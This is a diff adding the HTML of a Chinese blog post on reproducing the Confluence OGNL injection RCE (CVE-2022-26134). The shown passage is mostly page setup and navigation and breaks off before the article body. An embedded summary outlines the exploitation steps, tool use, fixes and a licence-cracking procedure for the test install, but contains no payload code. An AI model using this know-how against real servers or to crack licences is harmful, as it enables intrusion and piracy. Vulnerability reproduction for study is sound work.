@@ -1,0 +1,826 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Confluence-CVE-2022-26134 | 高木のBlog</title><meta name="keywords" content="RCE,漏洞复现,中间件,网络安全,渗透测试"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Confluence-CVE-2022-26134"><meta name="application-name" content="Confluence-CVE-2022-26134"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Confluence-CVE-2022-26134"><meta property="og:url" content="https://blog.takake.com/posts/62533/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="1.漏洞简介6.CVE-2022-26134 漏洞详解CVE-2022-26134 是 Atlassian Confluence 中的一个严重远程代码执行（RCE）漏洞，也称为 Confluence OGNL 注入漏洞。该漏洞允许攻击者通过构造恶意的 OGNL（Object-Graph Naviga"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png"><meta name="description" content="1.漏洞简介6.CVE-2022-26134 漏洞详解CVE-2022-26134 是 Atlassian Confluence 中的一个严重远程代码执行（RCE）漏洞，也称为 Confluence OGNL 注入漏洞。该漏洞允许攻击者通过构造恶意的 OGNL（Object-Graph Naviga"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/62533/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: {"mode":null,"api":null,"cover_change":true},
+  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
+  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  shortcutKey: undefined,
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '高木のBlog',
+  title: 'Confluence-CVE-2022-26134',
+  postAI: 'CVE-2022-26134 是一个高危的远程代码执行漏洞，影响范围广泛，利用条件简单。建议用户尽快升级版本并采取安全加固措施，以避免潜在的安全风险。通过禁用不必要的功能、限制访问权限和实施安全策略，可以有效降低漏洞被利用的风险。',
+  pageFillDescription: '1.漏洞简介, 6.CVE-2022-26134 漏洞详解, 1. 漏洞背景, 2. CVSS V3 评分, 3. 漏洞原理, 4. 影响版本, 5. 漏洞利用条件, 6. 漏洞复现, 7. 修复建议, 8. 总结, 2.破解流程, 3.安装配置, 4.复现流程漏洞简介漏洞详解是中的一个严重远程代码执行漏洞也称为注入漏洞该漏洞允许攻击者通过构造恶意的表达式在未经身份验证的情况下远程执行任意代码以下是该漏洞的详细解析包括漏洞原理利用条件影响版本及复现步骤漏洞背景是一款广泛使用的企业级和知识管理工具用于团队协作和信息共享年月发布安全公告披露了和中的一个严重漏洞攻击者可以通过注入实现远程代码执行危害极大评分评分高危漏洞原理漏洞的核心在于对用户输入的表达式处理不当注入是一种用于访问和操作对象图的表达式语言攻击者可以通过构造恶意的表达式将其注入到的请求中在处理这些请求时会解析并执行表达式导致任意代码执行漏洞触发点攻击者通过构造特定的请求将恶意表达式注入到的中例如攻击者可以通过以下执行命令该会执行命令并将结果返回给攻击者利用链攻击者通过发送恶意请求触发表达式的解析和执行成功利用后攻击者可以在目标服务器上执行任意命令例如创建管理员账户植入后门等影响版本受影响版本至至至至至至修复版本漏洞利用条件目标系统运行受影响版本的或目标系统未打补丁或未采取缓解措施攻击者权限攻击者无需身份验证即可利用该漏洞网络访问攻击者能够访问目标系统的服务端口默认漏洞复现以下是漏洞复现的简要步骤环境搭建使用或虚拟机搭建受影响的版本如构造使用以下执行命令如将进行编码后发送到目标服务器发送请求使用或发送恶意请求目标如果漏洞存在服务器会返回命令执行结果如工具利用使用自动化工具如进行漏洞检测和利用目标攻击机该工具可以读取目标服务器的文件内容或执行命令修复建议升级版本升级到的最新修复版本如等临时缓解措施替换受漏洞影响的文件如禁用的表达式解析功能安全加固使用防火墙或安全组规则限制对端口的访问定期监控系统日志检测异常访问行为总结是一个高危的远程代码执行漏洞影响范围广泛利用条件简单建议用户尽快升级版本并采取安全加固措施以避免潜在的安全风险通过禁用不必要的功能限制访问权限和实施安全策略可以有效降低漏洞被利用的风险破解流程界面默认开启端口为需要破解进入容器将解码包拉去到本地计算机将该包改名为运行破解工具输入任意名字复制并输入点击生成复制备用再点击破解选择刚刚重命名的包注意如果第二次需要删除文件显示表示破解成功接下来关闭破解软件即可将生成的改回原来的名字再将破解包中的和一起放入中的目录下在放入之前需要给它们附加权限重启容器访问输入获取到的安装配置需要多等待一会选择推荐配置管理用户和组账户密码随便填配置完成尝试创建空间发布文章复现流程使用发送请求不知道为什么只有能够成功执行使用进行测试但我们默认情况下使用和发包都没有回显这是因为重定向了所以需要在设置中关闭自动重定向然后再发送请求就能看到回显了我在中配置了不重定向不知道为什么不能成功',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-28 01:06:07',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 8 || hour >= 22
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "10",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>4</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>2</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">JAVA反序列化<sup>4</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">JAVA反序列化漏洞<sup>4</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 1.05rem;">JAVA高级<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>16</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/base64/" style="font-size: 1.05rem;">base64<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 1.05rem;">draft<sup>4</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/utf-8/" style="font-size: 1.05rem;">utf-8<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>13</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>10</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>4</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>18</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>19</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.05rem;">编码<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>7</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/RCE/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>RCE</span></a><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞复现</span></a><a class="article-meta__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>中间件</span></a><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Confluence-CVE-2022-26134</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-10T16:00:00.000Z" title="发表于 2024-02-11 00:00:00">2024-02-11</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-03-27T17:06:07.086Z" title="更新于 2025-03-28 01:06:07">2025-03-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">1.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Confluence-CVE-2022-26134"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" 